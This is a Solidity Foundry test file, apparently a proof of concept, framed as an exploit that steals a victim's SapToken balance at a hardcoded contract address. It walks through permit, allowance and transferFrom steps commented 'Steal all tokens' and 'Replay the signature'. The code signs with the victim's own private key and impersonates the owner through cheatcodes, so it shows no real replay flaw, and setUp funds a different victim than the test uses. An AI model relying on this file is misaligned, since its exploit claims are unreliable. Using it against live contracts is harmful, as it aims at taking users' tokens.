pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interface for SapToken
interface SapToken {
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function mint(address account_, uint256 amount_) external;
    function owner() external view returns (address);
    function vault() external view returns (address);
    function setVault(address vault_) external returns (bool);
    function nonces(address owner) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x039639Ed22A7654f74C1B0017C9d0DF85C26B63B;
    address attacker = address(this);
    address private victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create a victim address
        victim = address(0x1234567890123456789012345678901234567890);

        // Label addresses for clarity
        vm.label(victim, "Victim");
        vm.label(TARGET, "SapToken");

        // Give victim some SAP tokens (need to mint via vault)
        // First, we need to become the vault to mint tokens
        SapToken token = SapToken(TARGET);

        // Get the current vault address
        address vaultAddress = token.vault();

        // If vault is not set, we need to set it
        if (vaultAddress == address(0)) {
            // We need to become owner to set vault
            address owner = token.owner();
            vm.startPrank(owner);
            token.setVault(address(this));
            vm.stopPrank();
            vaultAddress = address(this);
        }

        // Now mint tokens to victim
        vm.prank(vaultAddress);
        token.mint(victim, 1000 * 10**9);  // 1000 tokens with 9 decimals

        // Verify victim has tokens
        uint256 victimBalance = token.balanceOf(victim);
        assertGt(victimBalance, 0, "Victim should have tokens");
    }

    // ─── Helper function to avoid stack too deep ─────────────
    function _generatePermitSignature(
        address victimAddress,
        uint256 victimPrivateKey,
        uint256 amount,
        uint256 nonce,
        uint256 deadline
    ) internal returns (uint8 v, bytes32 r, bytes32 s) {
        SapToken token = SapToken(TARGET);
        bytes32 domainSeparator = token.DOMAIN_SEPARATOR();

        // Create the hash struct
        bytes32 PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;
        bytes32 hashStruct = keccak256(
            abi.encode(
                PERMIT_TYPEHASH,
                victimAddress,
                attacker,
                amount,
                nonce,
                deadline
            )
        );

        // Create the final hash
        bytes32 hash = keccak256(
            abi.encodePacked(
                uint16(0x1901),
                domainSeparator,
                hashStruct
            )
        );

        // Sign the hash with victim's private key
        (v, r, s) = vm.sign(victimPrivateKey, hash);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Create victim with known private key
        uint256 victimPrivateKey = 0x1234567890AbcdEF1234567890aBcdef1234567890abcdef1234567890abcdef;
        address victimAddress = vm.addr(victimPrivateKey);

        // Label for clarity
        vm.label(victimAddress, "Victim");

        // Step 2: Mint tokens to victim (if not already done in setup)
        SapToken token = SapToken(TARGET);

        // Check if victim has tokens, if not mint some
        if (token.balanceOf(victimAddress) == 0) {
            // Need to mint via vault
            address vault = token.vault();
            if (vault == address(0)) {
                // Set ourselves as vault if not set
                address owner = token.owner();
                vm.startPrank(owner);
                token.setVault(address(this));
                vm.stopPrank();
                vault = address(this);
            }

            // Mint tokens to victim
            vm.prank(vault);
            token.mint(victimAddress, 1000 * 10**9);
        }

        // Step 3: Generate permit signature
        uint256 nonce = token.nonces(victimAddress);
        uint256 amount = token.balanceOf(victimAddress);  // Steal all tokens
        uint256 deadline = block.timestamp + 1 days;

        // Generate signature using helper function
        (uint8 v, bytes32 r, bytes32 s) = _generatePermitSignature(
            victimAddress,
            victimPrivateKey,
            amount,
            nonce,
            deadline
        );

        // Step 4: Replay the signature
        token.permit(victimAddress, attacker, amount, deadline, v, r, s);

        // Verify we got allowance
        uint256 allowance = token.allowance(victimAddress, attacker);
        assertEq(allowance, amount, "Should have allowance after permit");

        // Step 5: Transfer tokens to attacker
        token.transferFrom(victimAddress, attacker, amount);

        // Verify profit
        uint256 attackerBalance = token.balanceOf(attacker);
        assertGt(attackerBalance, 0, "Attacker should have stolen tokens");

        // Oracle check: nonce should be > 0
        uint256 victimNonceAfter = token.nonces(victimAddress);
        assertGt(victimNonceAfter, 0, "Nonce should be incremented");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

